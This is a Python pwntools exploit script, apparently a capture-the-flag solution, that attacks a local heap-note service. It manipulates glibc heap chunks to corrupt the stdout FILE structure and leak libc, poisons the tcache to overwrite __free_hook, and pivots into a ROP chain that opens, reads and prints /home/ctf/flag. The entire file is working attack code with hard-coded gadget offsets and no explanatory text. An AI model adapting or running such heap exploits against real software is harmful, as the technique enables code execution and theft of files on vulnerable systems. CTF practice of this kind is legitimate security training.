#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

def alloc(size, data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("chunk: ",str(size))
	io.sendafter("note: ",data)

def free(idx):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("index: ",str(idx))

def sname(name):
	io.sendlineafter("Choice: ",str(0x1337))
	io.sendafter("book: ",name)

####Addr
IO_wide_data = 0x3eb780
free_hook = 0x3ed8e8
main_arena = 0x3ebc40

####Gadgets
add_rsp = 0x405af
pop_rdi = 0x1651ab
pop_rsi = 0x15eda7
pop_rdx = 0x130866
pop_rsp = 0x153fd6
mov_gad = 0x09c8cb
pop_r12 = 0x163705
pop_rbx = 0x166ab5
syscall = 0xe5c05
pop_rax = 0x10fedc
add_rsp_0x8 = 0x163862

####Exploit
while True:
	io = remote("localhost",32768)
	for i in range(5):
		alloc(0x118,"HKHK") #0~4
	i = 4
	while i >= 0:
		free(i)
		i -= 1
	for i in range(5):
		alloc(0x178,"HKHK") #0~4
	for i in range(5):
		free(i)
	for i in range(2):
		alloc(0x168,"HKHK") #0~1
	alloc(0x168,p64(0x61)*7+p64(0x31))
	i = 2
	while i >= 0:
		free(i)
		i -= 1
	alloc(0x118,"HKHK") #0
	alloc(0x118,"HKHK") #1
	free(0)
	alloc(0x118,b"A"*0x18+p64(0x421)) #1
	free(1)
	free(0)
	alloc(0x118,b"A"*0x18+p64(0x421)+b"\x60"+p8(0x97)) #0
	alloc(0x118,b"A"*0x18+p64(0x21)+b"\x80") #1
	alloc(0x118,"HKHK") #2
	alloc(0x118,"HKHK") #3
	try:
		alloc(0x118,p64(0xfbad1800)+p64(0x0)*3+b"\x00")#4
		libc_leak = u64(io.recvn(0x28)[0x20:0x28])
		libc_base = libc_leak - IO_wide_data
		if libc_base&0xfff==0:
			print("Found")
			break
	except:
		io.close()
		continue
print("Libc base: 0x%x"%libc_base)
free(0)
free(2)
alloc(0x168,p64(0x0)*13+p64(0x71)+p64(libc_base+free_hook)+p64(0x51)) #0
alloc(0x178,p64(0x0)*15+p64(0x81)) #2
free(0)
free(2)
alloc(0x168,"/home/ctf/flag\x00") #0
rop1 =  p64(libc_base+pop_rsi)+\
	p64(0x0)+\
	p64(libc_base+pop_rax)+\
	p64(0x2)+\
	p64(libc_base+pop_rdx)+\
	p64(0x50)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rax)+\
	p64(libc_base+add_rsp_0x8)+\
	p64(libc_base+mov_gad)+\
	p64(libc_base+pop_rdi)+\
	p64(0x3)+\
	p64(libc_base+pop_rax)+\
	p64(0x0)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rdi)+\
	p64(0x1)+\
	p64(libc_base+pop_rax)+\
	p64(0x1)+\
	p64(libc_base+syscall)
alloc(0x168,p64(libc_base+add_rsp)+rop1) #2
rop2 =  p64(libc_base+pop_rsp)+\
	p64(libc_base+free_hook+0x8)
sname(rop2)
free(0)
io.interactive()
